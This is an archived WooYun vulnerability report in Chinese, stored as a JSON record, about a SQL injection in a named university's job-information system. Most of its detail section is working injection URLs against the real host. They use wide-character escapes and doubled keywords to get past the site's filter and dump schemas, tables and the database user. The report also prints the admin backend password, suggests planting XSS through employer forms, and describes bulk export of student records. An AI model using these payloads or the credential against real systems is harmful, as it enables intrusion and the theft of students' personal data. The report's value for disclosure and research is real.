{"id": 60206, "wybug_id": "wooyun-2013-044286", "wybug_title": "某校就业信息系统SQL注入后台弱口令可导致大量学生信息泄露", "wybug_corp": "郑州轻工业学院", "wybug_author": "RedFree", "wybug_date": "2013-11-28 14:43", "wybug_open_date": "2014-01-12 14:43", "wybug_type": "SQL注射漏洞", "wybug_level": "低", "wybug_rank_0": "5", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["字符类型注射", "管理后台对外", "后台被猜解", "注射技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-11-28：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2014-01-12：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述：     某高校就业系统SQL注入过滤可被绕过，导致数据库中信息泄露；可使用管理后台批量导出学生信息。 详细说明：      问题出在档案去向查询页，访问：http://job.zzuli.edu.cn/index_archives.php?search_keyword=1109059&search_type=1&actiontype=0    可查询学号为1109059的学生的档案去向。\n\n输入学号处对(',select,union,and,or,from)……关键词进行了转义和过滤，但是可以使用宽字符吃掉转义，使用s select elect、u union nion 来绕过关键字过滤。1、使用order by xx来猜字段总数：\n\n\n\n字段总数为118。2、查询所有库：\nhttp://job.zzuli.edu.cn/index_archives.php?search_keyword=1109059%C7' u union nion s select elect 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,1,2,3,4,5,6,7,8,9,10,11,12,13,14,SCHEMA_NAME,16,17,18 f from rom information_schema.SCHEMATA %23&search_type=1&actiontype=0\n得所有库：\n\n    information_schema    job_zzuli3、查询job_zzuli中所有表：\nhttp://job.zzuli.edu.cn/index_archives.php?search_keyword=1109059%D5' u union nion s select elect 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,1,2,3,4,5,6,7,8,9,10,11,12,13,14,table_name,table_schema,17,18 f from rom information_schema.tables %23&search_type=1&actiontype=0\n得：admin_itemadmin_itemfixplugadmin_itemplugadmin_logsadmin_menuadmin_navigationadmin_settingadmin_statadmin_usermenuadmin_voting_input_results2admin_voting_optionadmin_voting_option2admin_voting_pageadmin_voting_titleadmin_voting_title2bulletin_filesbulletin_imagesbulletin_zhaopinbulletin_zhaopinhuicode_byqxdmcode_dwjbdmcode_dwjjlxdmcode_dwxzdmcode_gzgllbdmcode_hyzkdmcode_jclbdmcode_jhxzdmcode_jsjspdmcode_jylsfsdmcode_mzcode_pyfsdmcode_tdfsdmcode_tdxzdmcode_wyjbdmcode_wyyz…………4、查询用户\nhttp://job.zzuli.edu.cn/index_archives.php?search_keyword=1109059%C7' u union nion s select elect 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,1,2,3,4,5,6,7,8,9,10,11,12,13,14,user(),16,17,18 %23&search_type=1&actiontype=0\n    job_zzuli@localhost5、查询数据库路径：    /var/lib/mysql/……  后台弱口令： admin  63556326  冒充用人单位，填写信息的时候加入XSS代码一样打到后台(管理员定期审核用人单位)。\n\n  大量学生信息：\n\n\n\n……   漏洞证明：  \n\n\n\n\n\n   修复方案：  1、过滤手段太简单，能不被绕吗……2、改一下后台口令吧。   版权声明：转载请注明来源 RedFree@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}